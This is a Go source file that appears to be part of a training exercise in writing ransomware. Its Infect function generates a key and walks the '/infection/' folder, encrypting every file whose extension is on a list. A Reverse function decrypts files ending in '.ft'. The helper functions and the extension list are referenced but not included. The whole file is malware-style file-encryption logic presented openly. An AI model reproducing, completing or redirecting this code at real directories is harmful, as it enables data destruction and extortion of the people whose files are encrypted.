package main

import (
	"os"
	"log"
	"path/filepath"
	"strings"
)

func IsValidFile(file string) bool {
	for _, ext := range extensions {
		if strings.HasSuffix(file, ext) {
			return true
		}
	}
	return false
}

func EncryptFiles(dest string, d os.DirEntry, err error) error  {
	if err != nil {
		return err
	}
	if !d.IsDir() && IsValidFile(dest) {
		EncryptFile(dest)
	}
	
	return nil
}

func DecryptFiles(dest string, d os.DirEntry, err error) error  {
	if err != nil {
		return err
	}
	if !d.IsDir() && strings.HasSuffix(dest, ".ft") {
		DecryptFile(dest)
	}

	return nil
}

func Infect() {
	destinationFolder := "/infection/"
	_, err := os.Stat(destinationFolder)
    if os.IsNotExist(err) {
		log.Fatal(err)
    }
	
	GenerateSecretKey()
	err = filepath.WalkDir(destinationFolder, EncryptFiles)
	if err != nil {
		log.Fatal(err)
	}
}

func Reverse() {
	destinationFolder := "/infection/"
	_, err := os.Stat(destinationFolder)
    if os.IsNotExist(err) {
		log.Fatal(err)
    }
	
	err = filepath.WalkDir(destinationFolder, DecryptFiles)
	if err != nil {
		log.Fatal(err)
	}
}